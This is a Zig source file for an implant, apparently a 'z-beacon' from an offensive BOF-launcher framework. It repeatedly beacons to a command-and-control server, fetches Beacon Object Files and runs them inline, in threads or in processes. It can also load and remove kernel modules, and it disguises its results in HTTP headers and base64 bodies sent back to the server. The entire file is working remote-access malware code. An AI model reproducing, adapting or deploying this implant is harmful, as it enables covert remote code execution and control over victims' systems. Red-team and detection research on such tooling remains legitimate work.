const std = @import("std");
const assert = std.debug.assert;
const bof = @import("bof_launcher_api");

pub const std_options = .{
    .http_disable_tls = true,
    .log_level = .info,
};
const debug_proxy_enabled = false;
const debug_proxy_host = "127.0.0.1";
const debug_proxy_port = 8080;

// BOF-specific error codes
const netFullHttpErrors = enum(u8) {
    OutOfMemory,
    Unknown,
};

const PendingBof = struct {
    context: ?*bof.Context = null,
    task_id: []const u8,
    is_persistent: bool = false,
    launcher_error_code: i32 = 0,
};

const BofRes = struct {
    status_code: i32 = 0,
    output: ?[]const u8 = null,
};

const State = struct {
    allocator: std.mem.Allocator,

    implant_identity: []u8,
    implant_actions: ImplantActions,

    jitter: u32,

    c2_host: [:0]const u8,
    c2_endpoint: [:0]const u8,
    assets_host: [:0]const u8,

    net_client: *anyopaque = undefined,

    pending_bofs: std.ArrayList(PendingBof),
    persistent_bofs: std.AutoHashMap(u64, bof.Object),

    base64_decoder: std.base64.Base64Decoder,
    base64_encoder: std.base64.Base64Encoder,

    fn getImplantIdentity(allocator: std.mem.Allocator) ![]u8 {
        const arch_name = @tagName(@import("builtin").cpu.arch);
        const os_release = @tagName(@import("builtin").os.tag);

        // TODO: Authorization: base64(ipid=arch:OS:hostname:internalIP:externalIP:currentUser:isRoot)
        const implant_id = try std.mem.join(allocator, "", &.{
            arch_name,
            ":",
            os_release,
        });

        return implant_id;
    }

    fn init(allocator: std.mem.Allocator) !State {
        const base64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
        const base64_encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '=');

        const implant_identity = try getImplantIdentity(allocator);

        const implant_actions: ImplantActions = .{
            .netConnect = netConnectC,
            .netDisconnect = netDisconnectC,
            .netSend = netSend,
            .netRecv = netRecv,
            .netUnmasquerade = netUnmasquerade,
            .netMasquerade = netMasquerade,
        };

        //TODO: move it to ImplanActions.netMasquarede(...) function
        const implant_identity_b64 = try allocator.alloc(u8, base64_encoder.calcSize(implant_identity.len));
        _ = std.base64.Base64Encoder.encode(&base64_encoder, implant_identity_b64, implant_identity);

        //const http_proxy = if (debug_proxy_enabled) blk: {
        //    const proxy = try allocator.create(std.http.Client.Proxy);
        //    proxy.* = .{
        //        .protocol = .plain,
        //        .authorization = null,
        //        .host = debug_proxy_host,
        //        .port = debug_proxy_port,
        //        .supports_connect = true,
        //    };
        //    break :blk proxy;
        //} else null;

        return State{
            .allocator = allocator,

            .implant_identity = implant_identity_b64,
            .implant_actions = implant_actions,

            .jitter = 3,

            .c2_host = try std.fmt.allocPrintZ(allocator, "127.0.0.1:8000", .{}),
            .c2_endpoint = try std.fmt.allocPrintZ(allocator, "/endpoint", .{}),
            .assets_host = try std.fmt.allocPrintZ(allocator, "127.0.0.1:8000", .{}),

            .base64_decoder = base64_decoder,
            .base64_encoder = base64_encoder,

            .pending_bofs = std.ArrayList(PendingBof).init(allocator),
            .persistent_bofs = std.AutoHashMap(u64, bof.Object).init(allocator),
        };
    }

    fn deinit(state: *State, allocator: std.mem.Allocator) void {
        allocator.free(state.implant_identity);

        allocator.free(state.c2_host);
        allocator.free(state.c2_endpoint);
        allocator.free(state.assets_host);

        state.pending_bofs.deinit();
        state.persistent_bofs.deinit();
        state.* = undefined;
    }
};

const ImplantActions = struct {
    const Self = @This();

    netConnect: *const fn (state: *anyopaque, address: [*:0]const u8) callconv(.C) ?*anyopaque = undefined,
    netDisconnect: *const fn (state: *anyopaque, conn: *anyopaque) callconv(.C) void = undefined,

    netSend: *const fn (state: *anyopaque, pkt_header: *anyopaque, pkt_data: ?*anyopaque, len: u32) callconv(.C) c_int = undefined,
    netRecv: *const fn (state: *anyopaque, buf: *anyopaque, body_len: *u32) callconv(.C) ?*anyopaque = undefined,

    netUnmasquerade: *const fn (state: *anyopaque, hdr: *anyopaque, data: ?*anyopaque, len: *u32) callconv(.C) ?*anyopaque = undefined,
    netMasquerade: *const fn (state: *anyopaque, hdr_to_mask: *anyopaque, data_to_mask: *anyopaque) callconv(.C) *anyopaque = undefined,

    kmodLoad: ?*const fn (module_image: [*]const u8, len: usize, param_values: [*:0]const u8) callconv(.C) c_int = null,
    kmodRemove: ?*const fn (mod_name: [*:0]const u8, flags: u32) callconv(.C) c_int = null,

    pub fn attachFunctionality(self: *Self, bofObj: bof.Object) void {
        const fields = @typeInfo(Self).Struct.fields;

        var ptr_table: [fields.len]usize = undefined;

        inline for (fields, 0..) |_, i| {
            ptr_table[i] = @intFromPtr(self) + i * @sizeOf(usize);
        }

        inline for (fields, 0..) |field, i| {
            @as(*usize, @ptrFromInt(ptr_table[i])).* = @intFromPtr(bofObj.getProcAddress(field.name));
        }
    }
};

fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, task_fields: [][]const u8) !void {
    const bof_task_id = task_fields[0];
    //const bof_name = task_fields[1];
    const bof_path = task_fields[2];
    const bof_header = task_fields[3];
    const bof_argv_b64 = task_fields[4];

    const len = try state.base64_decoder.calcSizeForSlice(bof_argv_b64);
    const bof_argv = try allocator.alloc(u8, len);
    defer allocator.free(bof_argv);
    _ = try state.base64_decoder.decode(bof_argv, bof_argv_b64);

    // process header { exec_mode:args_spec:hash:[persist] }
    var bof_header_iter = std.mem.splitScalar(u8, bof_header, ':');

    // get hint regarding execution mode
    const exec_mode = bof_header_iter.next() orelse return error.BadData;

    // get arguments specification string
    //const args_spec = bof_header_iter.next() orelse return error.BadData;
    _ = bof_header_iter.next() orelse return error.BadData;

    // get BOF's hash
    const hash = try std.fmt.parseInt(u64, bof_header_iter.next() orelse return error.BadData, 16);
    std.log.info("Received hash: 0x{x}", .{hash});

    // keep BOF in memory after running it?
    const is_persistent = if (bof_header_iter.next()) |v| std.mem.eql(u8, v, "persist") else false;

    var is_loaded: bool = false;
    var bof_to_exec: bof.Object = undefined;
    // BOF was already loaded persistently and is available
    if (state.persistent_bofs.get(hash)) |b| {
        std.log.info("Re-using existing persistent BOF (hash: 0x{x})", .{hash});
        bof_to_exec = b;
        is_loaded = true;

        // we need to fetch BOF file content from C2 sever
    } else {
        //const bof_content = try fetchBlob(allocator, state, bof_path);
        //defer allocator.free(bof_content);

        const uri = try std.fmt.allocPrintZ(allocator, "GET http://{s}{s}", .{ state.c2_host, bof_path });
        defer allocator.free(uri);

        std.log.info("fetching BOF", .{});
        const req = state.implant_actions.netConnect(state, uri);

        if (req) |req_raw| {
            _ = state.implant_actions.netSend(state, req_raw, null, 0);
            var body_len: u32 = 0;
            const bof_content: ?[*]u8 = @ptrCast(state.implant_actions.netRecv(state, req_raw, &body_len));
            std.log.info("after BOF fetch", .{});

            if (bof_content) |b| {
                bof_to_exec = try bof.Object.initFromMemory(b[0..body_len]);
                errdefer bof_to_exec.release();

                if (is_persistent) {
                    try state.persistent_bofs.put(hash, bof_to_exec);
                    std.log.info("Loaded new persistent BOF (hash: 0x{x})", .{hash});
                }
            }
            state.implant_actions.netDisconnect(state, req_raw);
        }
    }

    var bof_context: ?*bof.Context = null;
    errdefer if (bof_context) |context| context.release();

    std.log.info("bof_argv: {any}", .{bof_argv});

    const bof_args = try bof.Args.init();
    defer bof_args.release();

    var iter = std.mem.tokenizeScalar(u8, bof_argv, ' ');
    var i: u32 = 0;

    // build 'bof_args' by parsing 'argv' and inspecting args_spec:
    // possible values for args_spec: iszZb
    bof_args.begin();
    while (iter.next()) |arg| {
        std.log.info("Adding arg: {s}", .{arg});

        //if (args_spec[i] == 'b') {
        //    const buf = if (root.object.get(arg)) |value| buf: {
        //        const len = try state.base64_decoder.calcSizeForSlice(value.string);
        //        const buf = try allocator.alloc(u8, len);
        //        errdefer allocator.free(buf);
        //        _ = try state.base64_decoder.decode(buf, value.string);
        //        break :buf buf;
        //    } else null;
        //    defer if (buf) |b| allocator.free(b);

        //    std.log.info("buf: {s} {s}", .{ arg, buf.? });

        //    const trimmed_buf = std.mem.trimRight(u8, buf.?, "\n");

        //    const buf_len = try std.fmt.allocPrint(allocator, "i:{d}", .{trimmed_buf.len});
        //    defer allocator.free(buf_len);

        //    try bof_args.add(buf_len);
        //    try bof_args.add(std.mem.asBytes(&trimmed_buf.ptr));
        //} else {
        try bof_args.add(arg);
        //}

        i += 1;
    }
    bof_args.end();

    if (std.mem.eql(u8, exec_mode, "inline")) {
        std.log.info("Execution mode: {s}-based", .{exec_mode});

        bof_context = try bof_to_exec.run(bof_args.getBuffer());
    } else if (std.mem.eql(u8, exec_mode, "thread")) {
        std.log.info("Execution mode: {s}-based", .{exec_mode});

        bof_context = try bof_to_exec.runAsyncThread(
            bof_args.getBuffer(),
            null,
            null,
        );
    } else if (std.mem.eql(u8, exec_mode, "process")) {
        std.log.info("Execution mode: {s}-based", .{exec_mode});

        bof_context = try bof_to_exec.runAsyncProcess(
            bof_args.getBuffer(),
            null,
            null,
        );
    }
    // callback is a special mode of operation that behaves as follows:
    // 1. check if given BOF has go(...) function if so -> 2; else -> 3
    // 2. execute go() as inline BOF (this implies creating bof.Context object)
    // 3. call global_func_table.getPointers(bof) to provide BOF-stager's with implementation
    // BOF isn't executed (i.e. bof.Context isn't created). It provides one or more
    // function implementations for global_func_table. BOF is implicitly added to state.persistent_bofs.
    else if (std.mem.eql(u8, exec_mode, "callback")) {
        std.log.info("Execution mode: {s}-based", .{exec_mode});

        state.implant_actions.attachFunctionality(bof_to_exec);

        try state.persistent_bofs.put(hash, bof_to_exec);

        // BOF contains go(...) function, so execute it
        if (bof_to_exec.getProcAddress("go") != null) {
            bof_context = try bof_to_exec.run(bof_args.getBuffer());
        } else {
            // return here, as we do not create bof.Context so we don't want to append it to state.pending_bofs list
            return;
        }
    }

    if (bof_context) |context| {
        try state.pending_bofs.append(.{
            .context = context,
            .task_id = try allocator.dupe(u8, bof_task_id),
            .is_persistent = is_persistent,
        });
    } else return error.FailedToRunBof;
}

fn netDisconnectC(state: *anyopaque, conn: *anyopaque) callconv(.C) void {
    //const s: *State = @ptrCast(@alignCast(state));
    const req: *std.http.Client.Request = @ptrCast(@alignCast(conn));
    //const http_client: *std.http.Client = @ptrCast(@alignCast(s.net_client));

    _ = state;

    req.deinit();
    //http_client.deinit();
}

fn netConnect(s: *State, address: []const u8) !*std.http.Client.Request {
    var http_client: std.http.Client = .{
        .allocator = s.allocator,
    };
    const ptr_http_client = try s.allocator.create(std.http.Client);
    ptr_http_client.* = http_client;

    s.net_client = @constCast(@ptrCast(ptr_http_client));

    var iter_addr = std.mem.splitScalar(u8, address, ' ');
    const http_method = iter_addr.next() orelse unreachable;

    const url = iter_addr.next() orelse unreachable;

    const uri = try std.Uri.parse(std.mem.sliceTo(url, 0));

    // TODO: zwolnic pamiec
    //var server_header_buffer: [1024]u8 = undefined;
    const server_header_buffer = try s.allocator.alloc(u8, 16 * 1024);

    const req = try http_client.open(@enumFromInt(std.http.Method.parse(http_method)), uri, .{
        .server_header_buffer = server_header_buffer,
        .extra_headers = &.{.{ .name = "Authorization", .value = s.implant_identity }},
    });

    const ptr_req = try s.allocator.create(std.http.Client.Request);
    ptr_req.* = req;

    return ptr_req;
}

fn netConnectC(state: *anyopaque, address: [*:0]const u8) callconv(.C) ?*anyopaque {
    const s: *State = @ptrCast(@alignCast(state));
    const addr = std.mem.sliceTo(address, 0);

    const res = netConnect(s, addr) catch |err| switch (err) {
        error.OutOfMemory => return null,
        else => return null,
    };

    return @ptrCast(res);
}

fn netSend(state: *anyopaque, pkt_header: *anyopaque, pkt_data: ?*anyopaque, len: u32) callconv(.C) c_int {
    const s: *State = @ptrCast(@alignCast(state));
    const r: *std.http.Client.Request = @ptrCast(@alignCast(pkt_header));

    _ = s;

    // sends HTTP header
    r.send() catch unreachable;

    // sends HTTP body
    if (pkt_data != null and len > 0) {
        const d: [*]const u8 = @ptrCast(@alignCast(pkt_data));
        r.transfer_encoding = .{ .content_length = len };
        r.writeAll(d[0..len]) catch unreachable;
        r.finish() catch unreachable;
    }

    return 0;
}

fn netRecv(state: *anyopaque, buf: *anyopaque, body_len: *u32) callconv(.C) ?*anyopaque {
    const s: *State = @ptrCast(@alignCast(state));
    const r: *std.http.Client.Request = @ptrCast(@alignCast(buf));

    r.wait() catch unreachable;
    const body_content = s.allocator.alloc(u8, @intCast(r.response.content_length.?)) catch unreachable;

    _ = r.readAll(body_content) catch unreachable;

    body_len.* = @intCast(body_content.len);
    return body_content.ptr;
}

fn netMasquerade(state: *anyopaque, hdr_to_mask: *anyopaque, data_to_mask: *anyopaque) callconv(.C) *anyopaque {
    const s: *State = @ptrCast(@alignCast(state));
    const req: *std.http.Client.Request = @ptrCast(@alignCast(hdr_to_mask));
    const bof_res: *BofRes = @ptrCast(@alignCast(data_to_mask));

    req.headers.user_agent = std.http.Client.Request.Headers.Value{ .override = std.fmt.allocPrintZ(s.allocator, "result:{d}", .{bof_res.status_code}) catch unreachable };
    std.log.info("\nw netMasquerade (status_code): {d}", .{bof_res.status_code});

    if (bof_res.output) |output| {
        const out_b64 = s.allocator.alloc(u8, s.base64_encoder.calcSize(output.len)) catch unreachable;
        std.log.info("\nw netMasquerade (output): {s}", .{output});

        _ = s.base64_encoder.encode(out_b64, output);

        bof_res.output = out_b64;
    }

    return bof_res;
}

fn netUnmasquerade(state: *anyopaque, pkt_hdr: *anyopaque, pkt_data: ?*anyopaque, len: *u32) callconv(.C) ?*anyopaque {
    const s: *State = @ptrCast(@alignCast(state));
    const req: *std.http.Client.Request = @ptrCast(@alignCast(pkt_hdr));

    _ = s;

    std.log.info("req response status: {s}", .{req.response.status.phrase() orelse ""});
    if (req.response.status != .ok) {
        std.log.err("netConnect: Expected response status '200 OK' got '{} {s}'", .{
            @intFromEnum(req.response.status),
            req.response.status.phrase() orelse "",
        });
        return null;
    }

    var iter = req.response.iterateHeaders();
    var content_type: std.http.Header = undefined;
    while (iter.next()) |hdr| {
        if (std.mem.eql(u8, hdr.name, "Content-Type")) {
            content_type = hdr;
            break;
        }
    }

    std.log.info("Content type: {s}", .{content_type.value});

    if (!std.ascii.eqlIgnoreCase(content_type.value, "text/html; charset=utf-8")) {
        return null;
    }

    // copy and process data/len accordingly and return pointer to data ready for command processing
    // update len with a new length of the data:
    // const old_len = len.*;
    // len.* = new_len;
    _ = len;
    return pkt_data;
}

fn processCommands(allocator: std.mem.Allocator, state: *State, resp_content: []u8) !void {
    var task_fields = std.ArrayList([]const u8).init(allocator);
    defer task_fields.deinit();

    var task_id: []const u8 = undefined;
    var task_name: []const u8 = undefined;
    var i: u32 = 0;

    var iter_task = std.mem.splitScalar(u8, resp_content, ',');
    while (iter_task.next()) |field| {
        if (i == 0) task_id = field;
        if (i == 1) task_name = field;
        std.log.info("Field: {s}", .{field});
        try task_fields.append(field);
        i = i + 1;
    }

    // check type of task to execute:
    // bof - fetch and execute bof
    // cmd - execute builtin command (like: sleep <sec>; release_persistent_bofs, etc.)
    // kmod - fetch and load kernel module
    // TODO: fs - execute chosen executable from victim's filesystem
    var iter_command = std.mem.splitScalar(u8, task_name, ':');
    const cmd_prefix = iter_command.next() orelse return error.BadData;
    const cmd_name = iter_command.next() orelse return error.BadData;

    // tasked for BOF execution?
    if (std.mem.eql(u8, cmd_prefix, "bof")) {
        std.log.info("Executing bof: {s}", .{cmd_name});

        receiveAndLaunchBof(allocator, state, task_fields.items.ptr[0..task_fields.items.len]) catch |err| {
            try state.pending_bofs.append(.{
                .task_id = try allocator.dupe(u8, task_id),
                // TODO: Error codes may change in Zig, this is hacky.
                .launcher_error_code = @abs(@intFromError(err)) - 1000,
            });
        };
        // tasked for kernel module loading?
    } else if (std.mem.eql(u8, cmd_prefix, "kmod")) {
        if (state.implant_actions.kmodLoad == null) {
            std.log.info("Kernel module loading not implemented", .{});
            return error.BadData;
        }

        //const kmod_path = root.object.get("path").?.string;
        //const kmod_content = try fetchBlob(allocator, state, kmod_path);
        //defer allocator.free(kmod_content);

        //std.log.info("Loading kernel module: {s}", .{cmd_name});
        //_ = state.implant_actions.kmodLoad.?(kmod_content.ptr, kmod_content.len, "paaarams");
        // tasked for kernel module unloading?
    } else if (std.mem.eql(u8, cmd_prefix, "kmodrm")) {
        if (state.implant_actions.kmodRemove == null) {
            std.log.info("Kernel module unloading not implemented", .{});
            return error.BadData;
        }

        std.log.info("Removing kernel module: {s}", .{cmd_name});
        _ = state.implant_actions.kmodRemove.?(@ptrCast(cmd_name.ptr), 0);

        // tasked for custom command execution?
    } else if (std.mem.eql(u8, cmd_prefix, "cmd")) {
        std.log.info("Executing builtin command: {s}", .{cmd_name});

        // tasked to execute cmd:release_persistent_bofs
        if (std.mem.eql(u8, cmd_name, "release_persistent_bofs")) {
            var it = state.persistent_bofs.valueIterator();
            while (it.next()) |v| {
                const bof_object = v.*;
                bof_object.release();
            }
            state.persistent_bofs.clearAndFree();
        }
    }
}

fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
    var pending_bof_index: usize = 0;
    while (pending_bof_index != state.pending_bofs.items.len) {
        const pending_bof = state.pending_bofs.items[pending_bof_index];

        var bof_res = BofRes{
            .status_code = undefined,
            .output = null,
        };

        // BOF is still running
        if (pending_bof.context != null and pending_bof.context.?.isRunning()) {
            pending_bof_index += 1;
            continue;
        }

        // BOF run is completed so check its status code and output

        // checking status code
        bof_res.status_code = if (pending_bof.context) |context|
            @intCast(context.getExitCode())
        else
            pending_bof.launcher_error_code;

        // checking output
        if (pending_bof.context) |context| {
            if (context.getOutput()) |output|
                bof_res.output = allocator.dupe(u8, output) catch unreachable;

            if (!pending_bof.is_persistent)
                context.getObject().release();

            context.release();
        }

        // SENDING RESUTLS TO C2 SERVER:
        std.log.info("Bof launcher status code: {d}", .{bof_res.status_code});

        // establishing connection
        const addr = try std.fmt.allocPrintZ(allocator, "POST http://{s}{s}", .{ state.c2_host, state.c2_endpoint });
        defer allocator.free(addr);
        std.log.info("\nsending results to {s}", .{addr});
        const req = state.implant_actions.netConnect(state, addr);

        if (req) |req_raw| {
            // masquerading results in HTTP response
            std.log.info("\nprzed netMasquerade", .{});
            _ = state.implant_actions.netMasquerade(state, req_raw, &bof_res);

            if (bof_res.output) |output| {
                _ = state.implant_actions.netSend(state, req_raw, @constCast(@ptrCast(output.ptr)), @intCast(output.len));
                allocator.free(output);
            } else _ = state.implant_actions.netSend(state, req_raw, null, 0);

            var body_resp_len: u32 = 0;
            const resp_content: ?[*]u8 = @ptrCast(state.implant_actions.netRecv(state, req_raw, &body_resp_len));

            _ = resp_content;

            state.implant_actions.netDisconnect(state, req_raw);
        }

        allocator.free(pending_bof.task_id);
        _ = state.pending_bofs.swapRemove(pending_bof_index);
    }
}

pub export fn go(_: ?[*]u8, _: i32) callconv(.C) u8 {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    std.log.info("z-beacon launched", .{});

    var state = State.init(allocator) catch unreachable;
    defer state.deinit(allocator);

    const heartbeat_request = std.fmt.allocPrintZ(allocator, "GET http://{s}{s}", .{ state.c2_host, state.c2_endpoint }) catch unreachable;
    defer allocator.free(heartbeat_request);

    while (true) {
        // connect to C2 server
        const req = state.implant_actions.netConnect(&state, heartbeat_request);

        if (req) |req_raw| {
            _ = state.implant_actions.netSend(&state, req_raw, null, 0);

            // fetch data (if any) from C2 server
            var body_len: u32 = 0;
            const resp_content: ?[*]u8 = @ptrCast(state.implant_actions.netRecv(&state, req_raw, &body_len));

            // unmask received data
            const unmasked_resp_content: ?[*]u8 = @ptrCast(state.implant_actions.netUnmasquerade(&state, req_raw, resp_content, &body_len));

            // process command (if any)
            if (unmasked_resp_content) |buf| {
                processCommands(allocator, &state, buf[0..body_len]) catch {};
            }

            // disconnect from C2 server
            state.implant_actions.netDisconnect(&state, req_raw);

            // process queued BOFs
            processPendingBofs(allocator, &state) catch {};
        }

        std.time.sleep(state.jitter * @as(u64, 1e9));
    }
}
